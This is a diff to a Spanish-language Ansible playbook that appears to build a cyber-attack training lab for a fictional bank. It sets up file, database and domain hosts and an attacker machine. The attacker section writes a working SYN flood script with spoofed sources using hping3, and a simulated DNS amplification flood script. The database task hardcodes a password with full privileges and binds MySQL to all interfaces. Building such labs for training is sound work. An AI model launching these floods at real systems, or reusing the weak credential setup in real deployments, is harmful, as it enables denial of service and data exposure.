+    - name: Configurar NFS exports
+      ansible.builtin.copy:
+        content: |
+          # Banco del Sol - NFS Exports
+          /srv/samba/publico 10.10.2.0/24(rw,sync,no_subtree_check)
+          /srv/samba/datos 10.10.2.0/24(rw,sync,no_subtree_check)
+        dest: /etc/exports
+        owner: root
+        group: root
+        mode: '0644'
+    
+    - name: Iniciar servicios
+      ansible.builtin.systemd:
+        name: "{{ item }}"
+        state: started
+        enabled: yes
+      loop:
+        - smbd
+        - nmbd
+        - nfs-kernel-server
+
+- name: "Configurar servidor de base de datos"
+  hosts: database
+  become: yes
+  
+  tasks:
+    - name: Instalar MySQL
+      ansible.builtin.apt:
+        name:
+          - mysql-server
+          - mysql-client
+          - redis-server
+        state: present
+    
+    - name: Configurar MySQL
+      ansible.builtin.copy:
+        content: |
+          [mysqld]
+          bind-address = 0.0.0.0
+          max_connections = 200
+          innodb_buffer_pool_size = 256M
+          innodb_log_file_size = 64M
+          query_cache_type = 1
+          query_cache_size = 32M
+          slow_query_log = 1
+          slow_query_log_file = /var/log/mysql/slow.log
+          long_query_time = 2
+          general_log = 0
+          log_error = /var/log/mysql/error.log
+          
+          [client]
+          default-character-set = utf8mb4
+        dest: /etc/mysql/mysql.conf.d/bancodelsol.cnf
+        owner: root
+        group: root
+        mode: '0644'
+    
+    - name: Crear base de datos del banco
+      community.mysql.mysql_db:
+        name: bancodelsol
+        state: present
+        login_unix_socket: /var/run/mysqld/mysqld.sock
+    
+    - name: Crear usuario de la base de datos
+      community.mysql.mysql_user:
+        name: banco_app
+        password: "BancoSeguro2026!"
+        priv: "bancodelsol.*:ALL"
+        state: present
+        login_unix_socket: /var/run/mysqld/mysqld.sock
+    
+    - name: Configurar Redis
+      ansible.builtin.copy:
+        content: |
+          bind 10.10.2.30 127.0.0.1
+          port 6379
+          daemonize yes
+          pidfile /var/run/redis/redis-server.pid
+          logfile /var/log/redis/redis-server.log
+          databases 16
+          save 900 1
+          save 300 10
+          save 60 10000
+          maxmemory 256mb
+          maxmemory-policy allkeys-lru
+        dest: /etc/redis/redis.conf
+        owner: redis
+        group: redis
+        mode: '0640'
+    
+    - name: Iniciar servicios
+      ansible.builtin.systemd:
+        name: "{{ item }}"
+        state: started
+        enabled: yes
+      loop:
+        - mysql
+        - redis-server
+
+- name: "Configurar controlador de dominio"
+  hosts: domaincontroller
+  become: yes
+  gather_facts: no
+  
+  tasks:
+    - name: Verificar servicios de AD
+      ansible.windows.win_shell: |
+        Get-Service AD,DNS,DHCP | Select-Object Name,Status
+      register: ad_services
+      changed_when: false
+    
+    - name: Mostrar estado de AD
+      ansible.builtin.debug:
+        var: ad_services.stdout_lines
+
+- name: "Configurar estacion de trabajo"
+  hosts: workstation
+  become: yes
+  gather_facts: no
+  
+  tasks:
+    - name: Crear directorio de herramientas
+      ansible.windows.win_shell: |
+        New-Item -ItemType Directory -Force -Path "C:\Tools"
+        New-Item -ItemType Directory -Force -Path "C:\Tools\captures"
+        New-Item -ItemType Directory -Force -Path "C:\Tools\logs"
+      changed_when: false
+
+- name: "Configurar maquina atacante"
+  hosts: attacker
+  become: yes
+  
+  tasks:
+    - name: Verificar herramientas de ataque
+      ansible.builtin.shell: |
+        echo "=== Verificando herramientas ==="
+        which hping3
+        which nmap
+        which tcpdump
+        which scapy
+        echo "=== Fin verificacion ==="
+      register: tools_check
+      changed_when: false
+    
+    - name: Crear script de ataque SYN flood
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Banco del Sol - SYN Flood Attack Script
+          # PARA USO EDUCATIVO SOLAMENTE
+          
+          TARGET="10.10.1.10"
+          PORT=80
+          DURATION=60
+          
+          echo "=== SYN Flood Attack - Banco del Sol ==="
+          echo "Target: $TARGET:$PORT"
+          echo "Duration: $DURATION seconds"
+          echo ""
+          
+          # SYN flood with spoofed IPs
+          echo "Iniciando SYN flood..."
+          timeout $DURATION hping3 -S -p $PORT --flood --rand-source $TARGET
+          
+          echo ""
+          echo "=== Ataque completado ==="
+        dest: /usr/local/bin/syn_flood.sh
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Crear script de ataque amplificado
+      ansible.builtin.copy:
+        content: |
+          #!/usr/bin/env python3
+          """
+          Banco del Sol - DNS Amplification Attack Script (Simulated)
+          PARA USO EDUCATIVO SOLAMENTE
+          """
+          
+          import socket
+          import random
+          import time
+          import sys
+          
+          TARGET = "10.10.1.10"
+          TARGET_PORT = 80
+          DNS_SERVERS = ["172.16.0.20", "172.16.0.30"]
+          DURATION = 30
+          
+          def dns_amplification():
+              """Simula un ataque de amplificacion DNS"""
+              print("=== DNS Amplification Attack (Simulated) ===")
+              print(f"Target: {TARGET}:{TARGET_PORT}")
+              print(f"Duration: {DURATION} seconds")
+              print()
+              
+              # DNS query for a large record
+              dns_query = bytearray([
+                  0xaa, 0xbb,  # Transaction ID
+                  0x01, 0x00,  # Flags: Standard query
+                  0x00, 0x01,  # Questions: 1
+                  0x00, 0x00,  # Answer RRs: 0
+                  0x00, 0x00,  # Authority RRs: 0
+                  0x00, 0x00,  # Additional RRs: 0
+              ])
+              # Query for ANY record (amplification)
+              dns_query += b'\x03www\x09bancodelsol\x08example\x03com\x00\x00\xff\x00\x01'
+              
+              sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+              start = time.time()
+              count = 0
+              
+              try:
+                  while time.time() - start < DURATION:
+                      for dns_server in DNS_SERVERS:
+                          # Spoof source IP as target
+                          # In real attack, this would use raw sockets
+                          sock.sendto(dns_query, (dns_server, 53))
+                          count += 1
+                          
+                      time.sleep(0.001)  # Small delay
+                      
+                      if count % 1000 == 0:
+                          print(f"Sent {count} queries...")
+                          
+              except KeyboardInterrupt:
+                  pass
+              finally:
+                  sock.close()
+                  print(f"\nTotal queries sent: {count}")
+                  print("=== Attack simulation completed ===")
+          
+          if __name__ == "__main__":
+              dns_amplification()
+        dest: /usr/local/bin/dns_amplification.py
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Verificar instalacion
+      ansible.builtin.shell: |
+        echo "=== Verificacion final ==="
+        echo "Attacker: $(hostname)"
+        echo "IP: $(hostname -I)"
+        echo "Tools: $(which hping3 nmap tcpdump scapy 2>/dev/null | tr '\n' ' ')"
+        echo "=== Fin verificacion ==="
+      register: attacker_check
+      changed_when: false
+    
+    - name: Mostrar estado del atacante
+      ansible.builtin.debug:
+        var: attacker_check.stdout_lines
